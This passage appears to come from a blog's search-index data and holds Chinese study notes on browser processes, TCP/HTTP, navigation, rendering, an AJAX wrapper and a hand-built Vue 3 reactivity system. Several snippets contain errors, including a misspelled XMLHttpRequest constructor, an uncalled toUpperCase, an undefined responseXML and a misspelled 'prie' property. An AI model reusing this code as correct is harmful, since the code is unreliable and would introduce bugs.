主要是用来实现 3D，CSS等效果 网络进程 主要负责页面的网络资源加载 插件进程 主要是负责插件的进程，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响 多进程架构带来优缺点： 优点： 提高了稳定性、流畅性和安全性 缺点：更高的资源占用，更复杂的体系架构 二、 TCP协议：如何保证页面文件能被完整送达浏览器？在衡量 Web 页面性能的时候有一个重要的指标叫 “FP（First Paint）” ，是指 从页面加载到首次开始绘制的时长 。这个指标直接影响了用户的跳出率，更快的页面响应意味着更多的 PV、更高的参与度，以及更高的转化率。那什么影响 FP 指标呢？其中一个重要的因素是网络加载速度。 一个数据包的“旅程” IP: 把数据包送达目的主机 2. UDP：把数据包送达应用程序 增加了UDP传输层 \\3. TCP：把数据完整地送达应用程序 UDP的问题: 数据包在传输过程中容易丢失； 大文件会被拆成很多小的数据包来传输，这些小的数据包会经过不同的路由，并在不同的时间到达接收端，而UDP协议并不知道如何组装这些数据包，从而把这些数据包还原成完整的文件。 TCP的特点： 对于数据包丢失的情况，TCP提供重传机制； TCP引入了数据包排序机制，用来保证把乱序的数据包组合成一个完整的文件。 一个完整的TCP连接的生命周期: 总结： 互联网中的数据是通过数据包来传输的，数据包在传输过程中容易丢失或出错。 IP 负责把数据包送达目的主机。 UDP 负责把数据包送达具体应用。 而 TCP 保证了数据完整地传输，它的连接可分为三个阶段：建立连接、传输数据和断开连接。 三、HTTP请求流程： 为什么很多站点第二次打开速度会很快？HTTP 是一种允许浏览器向服务器获取资源的协议，是 Web 的基础 浏览器发起 HTTP 请求的流程 构建请求 1GET /index.html HTTP1.1 查找缓存 浏览器缓存是一种在本地保存资源副本，以供下次请求时直接使用的技术。 准备IP地址和端口 第一步浏览器会请求 DNS 返回域名对应的 IP。当然浏览器还提供了 DNS 数据缓存服务，如果某个域名已经解析过了，那么浏览器会缓存解析的结果，以供下次查询时直接使用，这样也会减少一次网络请求。 等待 TCP 队列 Chrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。 建立 TCP 连接 发送 HTTP 请求 浏览器是如何发送请求信息给服务器的？ 首先浏览器会向服务器发送请求行，它包括了请求方法、请求 URI（Uniform Resource Identifier）和 HTTP 版本协议。 服务端处理 HTTP 请求流程 返回请求 1curl -i https://time.geekbang.org/ 注意这里加上了-i是为了返回响应行、响应头和响应体的数据 i. 首先服务器会返回 响应行，包括协议和状态码。 ii. 然后发送响应头，包括 服务器生成返回数据的时间 返回的数据类型（JSON、HTML、流媒体等类型，），以及服务端要在客户端保存的cookie等信息 iii. 发送响应体，包含了HTML的实际内容 断开连接 通常情况下，一旦服务器向客户端返回了请求数据，它就要关闭 TCP 连接。不过如果浏览器或者服务器在其头信息中加入了： Connection:Keep-Alive 那么 TCP 连接在发送后将仍然保持打开状态，这样浏览器就可以继续通过同一个 TCP 连接发送请求。保持 TCP 连接可以省去下次请求时需要建立连接的时间，提升资源加载速度。 重定向 curl -I geekbang.org 注意这里输入的参数是-I，和-i不一样，-I表示只需要获取响应头和响应行数据，而不需要获取响应体的数据，最终返回的数据如下图所示： 从图中知道，301告诉浏览器重定向，网址是 Location 字段的内容 问题解答： 为什么很多站点第二次打开速度会很快？ 如果第二次页面打开很快，主要是第一次加载页面过程中，缓存了一些耗时的数据。（DNS 缓存和页面资源缓存） 缓存处理的过程： 图中知： 第一次请求时，http response header，浏览器是通过响应头中的Cache-Control字段来设置是否缓存该资源。 如果缓存过期了，浏览器则会继续发起网络请求，并且在 HTTP 请求头中带上： 1If-None-Match:&quot;4f80f-13c-3a1xb12a&quot; 没更新 =&gt; 304 更新了 =&gt; 最新的资源文件 简单说，DNS被缓存，节省查询解析时间 静态资源缓存在了本地，使用了本地副本，节省了时间 登录状态是如何保持的？ 用户打开登录页面，在登录框里填入用户名和密码，点击确定按钮。点击按钮会触发页面脚本生成用户登录信息，然后调用 POST 方法提交用户登录信息给服务器。 服务器接收到浏览器提交的信息之后，查询后台，验证用户登录信息是否正确，如果正确的话，会生成一段表示用户身份的字符串，并把该字符串写到响应头的 Set-Cookie 字段里，如下所示，然后把响应头发送给浏览器。 1Set-Cookie: UID=3431uad; 浏览器在接收到服务器的响应头后，开始解析响应头，如果遇到响应头里含有 Set-Cookie 字段的情况，浏览器就会把这个字段信息保存到本地。比如把UID=3431uad保持到本地。 当用户再次访问时，浏览器会发起 HTTP 请求，但在发起请求之前，浏览器会读取之前保存的 Cookie 数据，并把数据写进请求头里的 Cookie 字段里（如下所示），然后浏览器再将请求头发送给服务器。 服务器在收到 HTTP 请求头数据之后，就会查找请求头里面的“Cookie”字段信息，当查找到包含UID=3431uad的信息时，服务器查询后台，并判断该用户是已登录状态，然后生成含有该用户信息的页面数据，并把生成的数据发送给浏览器。 浏览器在接收到该含有当前用户的页面数据后，就可以正确展示用户登录的状态信息了。 简单地说，如果服务器端发送的响应头内有 Set-Cookie 的字段，那么浏览器就会将该字段的内容保存到本地。当下次客户端再往该服务器发送请求时，客户端会自动在请求头中加入 Cookie 值后再发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到该用户的状态信息。 附图： 从图中可以看到，浏览器中的 HTTP 请求从发起到结束一共经历了如下八个阶段：构建请求、查找缓存、准备 IP 和端口、等待 TCP 队列、建立 TCP 连接、发起 HTTP 请求、服务器处理请求、服务器返回请求和断开连接。 四、 导航流程： 从输入URL到页面显示，这中间发生了什么？ 浏览器进程、渲染进程和网络进程的主要职责： 浏览器进程主要负责用户交互、子进程管理和文件存储等功能 网络进程是面向渲染进程和浏览器进程等提供网络下载功能。 渲染进程的主要职责是把从网络下载的HTML、Javascript、css、图片等资源解析为可以显示和交互的页面。 简单小结： 用户输入URL，浏览器会根据用户输入的信息判断是搜索还是网址，如果是搜索内容，就将搜索内容+默认搜索引擎合成新的URL；如果用户输入的内容符合URL规则，浏览器就会根据URL协议，在这段内容上加上协议合成合法的URL 用户输入完内容，按下回车键，浏览器导航栏显示loading状态，但是页面还是呈现前一个页面，这是因为新页面的响应数据还没有获得 浏览器进程浏览器构建请求行信息，会通过进程间通信（IPC）将URL请求发送给网络进程 GET /index.html HTTP1.1 网络进程获取到URL，先去本地缓存中查找是否有缓存文件，如果有，拦截请求，直接200返回；否则，进入网络请求过程 网络进程请求:第一步进行DNS解析，返回域名对应的IP和端口号，如果之前DNS数据缓存服务缓存过当前域名信息，就会直接返回缓存信息；否则，发起请求获取根据域名解析出来的IP和端口号，如果没有端口号，http默认80，https默认443。如果是https请求，还需要建立TLS连接。 Chrome 有个机制，同一个域名同时最多只能建立 6 个TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。如果当前请求数量少于6个，会直接建立TCP连接。 TCP三次握手建立连接，http请求加上TCP头部——包括源端口号、目的程序端口号和用于校验数据完整性的序号，向下传输 网络层在数据包上加上IP头部——包括源IP地址和目的IP地址，继续向下传输到底层 底层通过物理网络传输给目的服务器主机 目的服务器主机网络层接收到数据包，解析出IP头部，识别出数据部分，将解开的数据包向上传输到传输层 目的服务器主机传输层获取到数据包，解析出TCP头部，识别端口，将解开的数据包向上传输到应用层 应用层HTTP解析请求头和请求体，如果需要重定向，HTTP直接返回HTTP响应数据的状态code301或者302，同时在请求头的Location字段中附上重定向地址，浏览器会根据code和Location进行重定向操作；如果不是重定向，首先服务器会根据 请求头中的If-None-Match 的值来判断请求的资源是否被更新，如果没有更新，就返回304状态码，相当于告诉浏览器之前的缓存还可以使用，就不返回新数据了；否则，返回新数据，200的状态码，并且如果想要浏览器缓存数据的话，就在相应头中加入字段： Cache-Control:Max-age=2000 响应数据又顺着应用层——传输层——网络层——底层——网络层——传输层——应用层的顺序返回到网络进程 数据传输完成，TCP四次挥手断开连接。如果，浏览器或者服务器在HTTP头部加上如下信息，TCP就一直保持连接。保持TCP连接可以省下下次需要建立连接的时间，提高资源加载速度 Connection:Keep-Alive 网络进程将获取到的数据包进行解析，根据响应头中的Content-type来判断响应数据的类型，如果是字节流类型，就将该请求交给下载管理器，该导航流程结束，不再进行；如果是text/html类型，就通知浏览器进程获取到文档准备渲染 浏览器进程获取到通知，根据当前页面B是否是从页面A打开的并且和页面A是否是同一个站点（根域名和协议一样就被认为是同一个站点），如果满足上述条件，就复用之前网页的进程，否则，新创建一个单独的渲染进程 浏览器进程会发出“提交文档”的消息给渲染进程，渲染进程收到消息后，会和网络进程建立传输数据的“管道”，文档数据传输完成后，渲染进程会返回“确认提交”的消息给浏览器进程 浏览器进程收到“确认提交”的消息后，会更新浏览器的页面状态，包括了安全状态、地址栏的 URL、前进后退的历史状态，并更新web页面，此时的web页面是空白页 渲染进程对文档进行页面解析和子资源加载，HTML 通过HTM 解析器转成DOM Tree（二叉树类似结构的东西），CSS按照CSS 规则和CSS解释器转成CSSOM TREE，两个tree结合，形成render tree（不包含HTML的具体元素和元素要画的具体位置），通过Layout可以计算出每个元素具体的宽高颜色位置，结合起来，开始绘制，最后显示在屏幕中新页面显示出来 笔记： curl -I + URL的命令是接收服务器返回的响应头的信息 12curl -I http://time.geekbang.org/复制代码 同一站点（same-site） 协议/根域名相同 例如： 1234https://time.geekbang.orghttps://www.geekbang.orghttps://www.geekbang.org:8080复制代码 他们都属于是同一站点，因为它们的协议都是HTTPS,而且根域名也都是 geekbang.org process-per-site-instance 策略： 如果从一个页面打开了另一个新页面，而新页面和当前页面属于同一站点的话，那么新页面会复用父页面的渲染进程 五、 渲染流程：HTML、CSS和 Javascript,是如何变成页面的？按照渲染的时间顺序，流水线分为如下几个子阶段： 构建Dom树 =&gt; 样式计算 =&gt; 布局阶段 =&gt; 分层 =&gt; 绘制 =&gt; 分块 =&gt; 栅格化 =&gt; 合成 1. 构建DOM树 2. 样式计算 把CSS转换为浏览器能够理解的结构 转换样式表中的属性值，使其标准化 计算出 DOM 树中每个节点的具体样式（css继承和层叠规则） 3.布局阶段 创建布局树 为了构建布局树，浏览器大体上完成了下面这些工作： 遍历DOM树中的所有的可见节点，并把这些节点添加到布局树中； 而不可见节点会被布局树忽略掉。 布局计算 4. 分层 渲染引擎会为哪些特定的节点创建新的图层呢？ 拥有层叠上下文属性的元素会被提升为单独的一层。 需要剪裁（clip）的地方也会被创建为图层 5. 图层绘制 6. 栅格化（raster）操作是指将图块转换为位图 从图中可以看出，渲染进程把生成图块的指令发送给 GPU，然后在 GPU 中执行生成图块的位图，并保存在 GPU 的内存中。 7. 合成和显示图块都被光栅化后，合成线程生成一个绘制图块的命令“DrawQuad”，然后将命令提交给浏览器进程。 浏览器进程里的viz组件，用来接受合成线程发过来的DrawQuad命令，然后根据DrawQuad命令，将其页面内容绘制到内存中，最后在将内存显示在屏幕上 渲染流水线大总结 结合上图，一个完整的渲染进程大致可总结为如下： 渲染进程将HTML内容转换为能够读懂的DOM树结构 渲染引擎将css样式表转化为浏览器可以理解的styleSheets,计算出DOM节点的样式 创建 布局树，并计算元素的布局信息。 对布局树进行分层，并生成分层树 为每个图层生成绘制列表，并将其提交到合成线程。 合成线程将图层分成图块，并在光栅化线程池中将图块转换成位图。 合成线程发送绘制图块命令 DrawQuad 给浏览器进程。 浏览器进程根据 DrawQuad消息生成页面，并显示到显示器上。 拓展：重排：通过 JavaScript 或者 CSS 修改元素的几何位置属性，重排需要更新完整的渲染流水线，所以开销也是最大的。 重绘：重绘省去了布局和分层阶段，所以执行效率会比重排操作要高一些。 合成阶段：使用了 CSS 的 transform 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。这样的效率是最高的，因为是在非主线程上合成，并没有占用主线程的资源，另外也避开了布局和绘制两个子阶段，所以相对于重绘和重排，合成能大大提升绘制效率。 减少重排重绘, 方法很多： 使用 class 操作样式，而不是频繁操作 style 避免使用 table 布局 批量dom 操作，例如 createDocumentFragment，或者使用框架，例如 React Debounce （window resize，scroll） 事件 对 dom 属性的读写要分离 will-change: transform 做优化 转载自链接：https://juejin.cn/post/6896238768324509703","categories":[{"name":"浏览器","slug":"浏览器","permalink":"https://coloey.github.io/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"}],"tags":[]},{"title":"ajax","slug":"ajax","date":"2022-05-05T07:41:40.000Z","updated":"2022-05-05T10:18:10.633Z","comments":true,"path":"2022/05/05/ajax/","link":"","permalink":"https://coloey.github.io/2022/05/05/ajax/","excerpt":"","text":"是什么AJAX全称是Async JavaScript and XML,即异步的JavaScript和XML，是一种创建交互式网页应用的网页开发技术，可以在不重新加载整个网页的情况下，与服务器交换数据，并且更新部分网页 实现过程实现Ajax异步交互需要服务器逻辑进行配合，需要完成以下步骤： 创建Ajax的核心对象XMLHttpRequest对象 通过XMLHttpRequest对象的open()方法与服务器建立连接 构建请求所需的数据内容，并通过XMLHttpRequest对象的send()方法发送给服务器端 通过XMLHttpRequest对象提供的onreadystatechange事件监听服务端你的通信状态 接受并处理服务端向客户端响应的数据结果 将处理结果更新到HTML页面中 创建XMLHttpReauest对象通过XMLHttpRequest()构造函数用于初始化一个XMLHttpRequest实例对象 1const xhr=new XMLHttpRequest() 与服务器端建立连接通过XMLHttpRequest对象的open()方法与服务器建立连接 1xhr.open(method,url,[async][,user][,password]) method:表示当前请求方式，常见的有GET,POST url:服务端地址 async:布尔值，表示用于异步执行操作，默认为true user:可选的用户名用于认证用途，默认为null password:可选的密码用于认证用途，默认为null 给服务端发送数据通过XMLHttpRequest对象的send()方法，将客户端页面的数据发送给服务端 1xhr.send([body]) body:在XHR请求中要发送的数据体，如果不传递数据则为null 如果使用GET请求发送数据，需要注意： 将请求数据添加到open()方法的url地址中 发送请求数据的send()方法中参数设置为null 绑定onreadystatechange事件 onreadystatechange事件用于监听服务器端的通信状态，主要监听的属性为XMLHttpRequest.readyState,关于XMLHttpRequest.readyState属性有五个状态 只要readyState属性值一变化，就会触发一次readyStatechange事件，XMLHttpRequest.reponseText属性用于接收服务器端的响应结果 封装1234567891011121314151617181920212223242526272829303132function ajax(options)&#123; //创建一个XMLHttpRequest对象 const xhr=new XHRHttpRequest() //初始化参数内容 options=options||&#123;&#125; options.type=(options||&#x27;GET&#x27;).toUpperCase options.dataType=options.dataType||&#x27;json&#x27; const params=options.data //发送请求 if(options.type===&#x27;GET&#x27;)&#123; xhr.open(&#x27;GET&#x27;,options.url+&quot;?&quot;+params,true) xhr.send(null) &#125;else if(options.type===&#x27;POST&#x27;)&#123; xhr.open(&#x27;POST&#x27;,options.url,true) xhr.send(params) &#125; //接收请求 xhr.onreadystatechange=function()&#123; if(xhr.readyState===4)&#123; let status=xhr.status if(status&gt;=200&amp;&amp;status&lt;300)&#123; options.success&amp;&amp;options.success(xhr.responseText,xhr,responseXML) &#125;else&#123; options.fail&amp;&amp;options.fail(status) &#125; &#125; &#125;&#125; 使用 123456789101112ajax(&#123; type:&#x27;post&#x27;, dataType:&#x27;json&#x27;, data:&#123;&#125;, url:&#x27;https://xxx&#x27;, success:function(text,xml)&#123; console.log(text) &#125;, fail:function(status)&#123; console.log(status) &#125;&#125;)","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"Vue3响应式原理","slug":"Vue3响应式原理","date":"2022-05-04T03:59:43.000Z","updated":"2022-05-04T05:20:48.925Z","comments":true,"path":"2022/05/04/Vue3响应式原理/","link":"","permalink":"https://coloey.github.io/2022/05/04/Vue3%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86/","excerpt":"","text":"一、Vue 3 响应式使用1 实现单个值的响应式在普通 JS 代码执行中，并不会有响应式变化，比如在控制台执行下面代码： 12345let price = 10, quantity = 2;const total = price * quantity;console.log(`total: $&#123;total&#125;`); // total: 20price = 20;console.log(`total: $&#123;total&#125;`); // total: 20 从这可以看出，在修改 price 变量的值后， total 的值并没有发生改变。 那么如何修改上面代码，让 total 能够自动更新呢？我们其实可以将修改 total 值的方法保存起来，等到与 total 值相关的变量（如 price 或 quantity 变量的值）发生变化时，触发该方法，更新 total 即可。我们可以这么实现： 12345678910111213let price = 10, quantity = 2, total = 0;const dep = new Set(); // ① const effect = () =&gt; &#123; total = price * quantity &#125;;const track = () =&gt; &#123; dep.add(effect) &#125;; // ②const trigger = () =&gt; &#123; dep.forEach( effect =&gt; effect() )&#125;; // ③track();console.log(`total: $&#123;total&#125;`); // total: 0trigger();console.log(`total: $&#123;total&#125;`); // total: 20price = 20;trigger();console.log(`total: $&#123;total&#125;`); // total: 40 上面代码通过 3 个步骤，实现对 total 数据进行响应式变化： ① 初始化一个 Set 类型的 dep 变量，用来存放需要执行的副作用（ effect 函数），这边是修改 total 值的方法； ② 创建 track() 函数，用来将需要执行的副作用保存到 dep 变量中（也称收集副作用）； ③ 创建 trigger() 函数，用来执行 dep 变量中的所有副作用； 在每次修改 price 或 quantity 后，调用 trigger() 函数执行所有副作用后， total 值将自动更新为最新值。 2 实现单个对象的响应式通常，我们的对象具有多个属性，并且每个属性都需要自己的 dep。我们如何存储这些？比如： 1let product = &#123; price: 10, quantity: 2 &#125;; 从前面介绍我们知道，我们将所有副作用保存在一个 Set 集合中，而该集合不会有重复项，这里我们引入一个 Map 类型集合（即 depsMap ），其 key 为对象的属性（如： price 属性）， value 为前面保存副作用的 Set 集合（如： dep 对象），大致结构如下图： 12345678910111213141516171819202122232425let product = &#123; price: 10, quantity: 2 &#125;, total = 0;const depsMap = new Map(); // ① const effect = () =&gt; &#123; total = product.price * product.quantity &#125;;const track = key =&gt; &#123; // ② let dep = depsMap.get(key); if(!dep) &#123; depsMap.set(key, (dep = new Set())); &#125; dep.add(effect);&#125;const trigger = key =&gt; &#123; // ③ let dep = depsMap.get(key); if(dep) &#123; dep.forEach( effect =&gt; effect() ); &#125;&#125;;track(&#x27;price&#x27;);console.log(`total: $&#123;total&#125;`); // total: 0effect();console.log(`total: $&#123;total&#125;`); // total: 20product.price = 20;trigger(&#x27;price&#x27;);console.log(`total: $&#123;total&#125;`); // total: 40 上面代码通过 3 个步骤，实现对 total 数据进行响应式变化： ① 初始化一个 Map 类型的 depsMap 变量，用来保存每个需要响应式变化的对象属性（key 为对象的属性， value 为前面 Set 集合）； ② 创建 track() 函数，用来将需要执行的副作用保存到 depsMap 变量中对应的对象属性下（也称收集副作用）； ③ 创建 trigger() 函数，用来执行 dep 变量中指定对象属性的所有副作用； 这样就实现监听对象的响应式变化，在 product 对象中的属性值发生变化， total 值也会跟着更新。 3 实现多个对象的响应式如果我们有多个响应式数据，比如同时需要观察对象 a 和对象 b 的数据，那么又要如何跟踪每个响应变化的对象？ 这里我们引入一个 WeakMap 类型的对象，将需要观察的对象作为 key ，值为前面用来保存对象属性的 Map 变量。代码如下： 12345678910111213141516171819202122232425262728293031let product = &#123; price: 10, quantity: 2 &#125;, total = 0;const targetMap = new WeakMap(); // ① 初始化 targetMap，保存观察对象const effect = () =&gt; &#123; total = product.price * product.quantity &#125;;const track = (target, key) =&gt; &#123; // ② 收集依赖 let depsMap = targetMap.get(target); if(!depsMap)&#123; targetMap.set(target, (depsMap = new Map())); &#125; let dep = depsMap.get(key); if(!dep) &#123; depsMap.set(key, (dep = new Set())); &#125; dep.add(effect);&#125;const trigger = (target, key) =&gt; &#123; // ③ 执行指定对象的指定属性的所有副作用 const depsMap = targetMap.get(target); if(!depsMap) return; let dep = depsMap.get(key); if(dep) &#123; dep.forEach( effect =&gt; effect() ); &#125;&#125;;track(product, &#x27;price&#x27;);console.log(`total: $&#123;total&#125;`); // total: 0effect();console.log(`total: $&#123;total&#125;`); // total: 20product.price = 20;trigger(product, &#x27;price&#x27;);console.log(`total: $&#123;total&#125;`); // total: 40 上面代码通过 3 个步骤，实现对 total 数据进行响应式变化： ① 初始化一个 WeakMap 类型的 targetMap 变量，用来要观察每个响应式对象； ② 创建 track() 函数，用来将需要执行的副作用保存到指定对象（ target ）的依赖中（也称收集副作用）； ③ 创建 trigger() 函数，用来执行指定对象（ target ）中指定属性（ key ）的所有副作用； 这样就实现监听对象的响应式变化，在 product 对象中的属性值发生变化， total 值也会跟着更新。 大致流程如下图： 二、Proxy 和 Reflect在上一节内容中，介绍了如何在数据发生变化后，自动更新数据，但存在的问题是，每次需要手动通过触发 track() 函数搜集依赖，通过 trigger() 函数执行所有副作用，达到数据更新目的。 这一节将来解决这个问题，实现这两个函数自动调用。 1. 如何实现自动操作这里我们引入 JS 对象访问器的概念，解决办法如下： 在读取（GET 操作）数据时，自动执行 track() 函数自动收集依赖； 在修改（SET 操作）数据时，自动执行 trigger() 函数执行所有副作用； 那么如何拦截 GET 和 SET 操作？接下来看看 Vue2 和 Vue3 是如何实现的： 在 Vue2 中，使用 ES5 的 Object.defineProperty() 函数实现； 在 Vue3 中，使用 ES6 的 Proxy 和 Reflect API 实现； 需要注意的是：Vue3 使用的 Proxy 和 Reflect API 并不支持 IE。 Object.defineProperty() 函数这边就不多做介绍，可以阅读文档，下文将主要介绍 Proxy 和 Reflect API。 2. 如何使用 Reflect通常我们有三种方法读取一个对象的属性： 使用 . 操作符：leo.name ； 使用 [] ： leo[&#39;name&#39;] ； 使用 Reflect API： Reflect.get(leo, &#39;name&#39;) 。 这三种方式输出结果相同。 3. 如何使用 ProxyProxy 对象用于创建一个对象的代理，从而实现基本操作的拦截和自定义（如属性查找、赋值、枚举、函数调用等）。语法如下 1const p = new Proxy(target, handler) 参数如下： target : 要使用 Proxy 包装的目标对象（可以是任何类型的对象，包括原生数组，函数，甚至另一个代理）。 handler : 一个通常以函数作为属性的对象，各属性中的函数分别定义了在执行各种操作时代理 p 的行为 12345678910let product = &#123; price: 10, quantity: 2 &#125;;let proxiedProduct = new Proxy(product, &#123; get(target, key)&#123; console.log(&#x27;正在读取的数据：&#x27;,key); return target[key]; &#125;&#125;)console.log(proxiedProduct.price); // 正在读取的数据： price// 10 然后结合 Reflect 使用，只需修改 get 函数： 1234 get(target, key, receiver)&#123; console.log(&#x27;正在读取的数据：&#x27;,key); return Reflect.get(target, key, receiver);&#125; 输出结果还是一样。 接下来增加 set 函数，来拦截对象的修改操作： 12345678910111213141516let product = &#123; price: 10, quantity: 2 &#125;;let proxiedProduct = new Proxy(product, &#123; get(target, key, receiver)&#123; console.log(&#x27;正在读取的数据：&#x27;,key); return Reflect.get(target, key, receiver); &#125;, set(target, key, value, receiver)&#123; console.log(&#x27;正在修改的数据：&#x27;, key, &#x27;,值为：&#x27;, value); return Reflect.set(target, key, value, receiver); &#125;&#125;)proxiedProduct.price = 20;console.log(proxiedProduct.price); // 正在修改的数据： price ,值为： 20// 正在读取的数据： price// 20 4. 修改 track 和 trigger 函数通过上面代码，我们已经实现一个简单 reactive() 函数，用来将普通对象转换为响应式对象。但是还缺少自动执行 track() 函数和 trigger() 函数，接下来修改上面代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const targetMap = new WeakMap();let total = 0;const effect = () =&gt; &#123; total = product.price * product.quantity &#125;;const track = (target, key) =&gt; &#123; let depsMap = targetMap.get(target); if(!depsMap)&#123; targetMap.set(target, (depsMap = new Map())); &#125; let dep = depsMap.get(key); if(!dep) &#123; depsMap.set(key, (dep = new Set())); &#125; dep.add(effect);&#125;const trigger = (target, key) =&gt; &#123; const depsMap = targetMap.get(target); if(!depsMap) return; let dep = depsMap.get(key); if(dep) &#123; dep.forEach( effect =&gt; effect() ); &#125;&#125;;const reactive = (target) =&gt; &#123; const handler = &#123; get(target, key, receiver)&#123; console.log(&#x27;正在读取的数据：&#x27;,key); const result = Reflect.get(target, key, receiver); track(target, key); // 自动调用 track 方法收集依赖 return result; &#125;, set(target, key, value, receiver)&#123; console.log(&#x27;正在修改的数据：&#x27;, key, &#x27;,值为：&#x27;, value); const oldValue = target[key]; const result = Reflect.set(target, key, value, receiver); if(oldValue != result)&#123; trigger(target, key); // 自动调用 trigger 方法执行依赖 &#125; return result; &#125; &#125; return new Proxy(target, handler);&#125;let product = reactive(&#123;price: 10, quantity: 2&#125;); effect();console.log(total); product.price = 20;console.log(total); // 正在读取的数据： price// 正在读取的数据： quantity// 20// 正在修改的数据： price ,值为： 20// 正在读取的数据： price// 正在读取的数据： quantity// 40 三、activeEffect 和 ref在上一节代码中，还存在一个问题： track 函数中的依赖（ effect 函数）是外部定义的，当依赖发生变化， track 函数收集依赖时都要手动修改其依赖的方法名。 比如现在的依赖为 foo 函数，就要修改 track 函数的逻辑，可能是这样： 12345const foo = () =&gt; &#123; /**/ &#125;;const track = (target, key) =&gt; &#123; // ② // ... dep.add(foo);&#125; 1. 引入 activeEffect 变量接下来引入 activeEffect 变量，来保存当前运行的 effect 函数。 123456let activeEffect = null;const effect = eff =&gt; &#123; activeEffect = eff; // 1. 将 eff 函数赋值给 activeEffect activeEffect(); // 2. 执行 activeEffect activeEffect = null;// 3. 重置 activeEffect&#125; 然后在 track 函数中将 activeEffect 变量作为依赖： 12345678910111213const track = (target, key) =&gt; &#123; if (activeEffect) &#123; // 1. 判断当前是否有 activeEffect let depsMap = targetMap.get(target); if (!depsMap) &#123; targetMap.set(target, (depsMap = new Map())); &#125; let dep = depsMap.get(key); if (!dep) &#123; depsMap.set(key, (dep = new Set())); &#125; dep.add(activeEffect); // 2. 添加 activeEffect 依赖 &#125;&#125; 123effect(() =&gt; &#123; total = product.price * product.quantity&#125;); 这样就可以解决手动修改依赖的问题，这也是 Vue3 解决该问题的方法 2. 引入 ref 方法熟悉 Vue3 Composition API 的朋友可能会想到 Ref，它接收一个值，并返回一个响应式可变的 Ref 对象，其值可以通过 value 属性获取。 ref：接受一个内部值并返回一个响应式且可变的 ref 对象。ref 对象具有指向内部值的单个 property .value。 官网的使用示例如下： 12345const count = ref(0)console.log(count.value) // 0count.value++console.log(count.value) // 1 我们有 2 种方法实现 ref 函数： 使用 rective 函数1const ref = intialValue =&gt; reactive(&#123;value: intialValue&#125;); 使用对象的属性访问器（计算属性）属性方式去包括：getter 和 setter。 1234567891011121314const ref = raw =&gt; &#123; const r = &#123; get value()&#123; track(r, &#x27;value&#x27;); return raw; &#125;, set value(newVal)&#123; raw = newVal; trigger(r, &#x27;value&#x27;); &#125; &#125; return r;&#125; 四、完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081const targetMap=new WeakMap()let activeEffect=nullfunction effect(eff)&#123; activeEffect=eff activeEffect() activeEffect=null&#125;function track(target,key)&#123; if(activeEffect)&#123; let depsMap=targetMap.get(target) if(!depsMap)&#123; targetMap.set(target,(depsMap=new Map())) &#125; let dep=depsMap.get(key) if(!dep)&#123; depsMap.set(key,(dep=new Set())) &#125; dep.add(activeEffect) &#125;&#125;function trigger(target,key)&#123; const depsMap=targetMap.get(target) if(!depsMap)return const dep=depsMap.get(key) if(dep)&#123; dep.forEach(effect=&gt;&#123; effect() &#125;) &#125;&#125;function reactive(target)&#123; const handler=&#123; get(target,key,receiver)&#123; let res=Reflect.get(target,key,receiver) track(target,key)//if reactive property is Get inside then tarck the effect to rerun on SET,add the effect to the dep return res &#125;, set(target,key,value,receiver)&#123; let oldValue=target[key] let res=Reflect.set(target,key,value,receiver) if(res&amp;&amp;oldValue!=value) &#123; trigger(target,key)//if this reactive property has effects to rerun on SET,trigger them &#125; return res &#125; &#125; return new Proxy(target,handler)&#125;function ref(raw)&#123; const r=&#123; get value()&#123; track(r,&#x27;value&#x27;) return raw &#125;, set value(newval)&#123; raw=newval trigger(r,&#x27;value&#x27;) &#125; &#125; return r;&#125;let product=reactive(&#123;prie:5,quantity:2&#125;)let salePrice=ref(0)let total=0effect(()=&gt;&#123; salePrice.value=product.price*0.9&#125;)effect(()=&gt;&#123; total=salePrice.value*product.quantity&#125;)console.log(`Before updated quantity total=$&#123;total&#125; salePrice=$&#123;salePrice.value&#125;`)product.quantity=3console.log(`After updated quantity total=$&#123;total&#125; salePrice=$&#123;salePrice.value&#125;`)product.price=10console.log(`After updated quantity total=$&#123;total&#125; salePrice=$&#123;salePrice.value&#125;`)","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"Vue3性能提升的几个方面","slug":"Vue3性能提升的几个方面","date":"2022-05-03T08:54:35.000Z","updated":"2022-05-03T09:14:13.809Z","comments":true,"path":"2022/05/03/Vue3性能提升的几个方面/","link":"","permalink":"https://coloey.github.io/2022/05/03/Vue3%E6%80%A7%E8%83%BD%E6%8F%90%E5%8D%87%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E9%9D%A2/","excerpt":"","text":"编译阶段： diff算法优化 静态提升 事件监听缓存 SSR优化 diff算法优化vue3在diff算法中相比vue2增加了静态标记 作用是为了会发生变化的地方添加一个flag标记，下次发生变化的时候直接找该地方进行比较。已经标记静态结点的p标签在diff过程中不会比较，把性能进一步提高 关于静态类型： 123456789101112131415export const enum PatchFlags &#123; TEXT = 1,// 动态的文本节点 CLASS = 1 &lt;&lt; 1, // 2 动态的 class STYLE = 1 &lt;&lt; 2, // 4 动态的 style PROPS = 1 &lt;&lt; 3, // 8 动态属性，不包括类名和样式 FULL_PROPS = 1 &lt;&lt; 4, // 16 动态 key，当 key 变化时需要完整的 diff 算法做比较 HYDRATE_EVENTS = 1 &lt;&lt; 5, // 32 表示带有事件监听器的节点 STABLE_FRAGMENT = 1 &lt;&lt; 6, // 64 一个不会改变子节点顺序的 Fragment KEYED_FRAGMENT = 1 &lt;&lt; 7, // 128 带有 key 属性的 Fragment UNKEYED_FRAGMENT = 1 &lt;&lt; 8, // 256 子节点没有 key 的 Fragment NEED_PATCH = 1 &lt;&lt; 9, // 512 DYNAMIC_SLOTS = 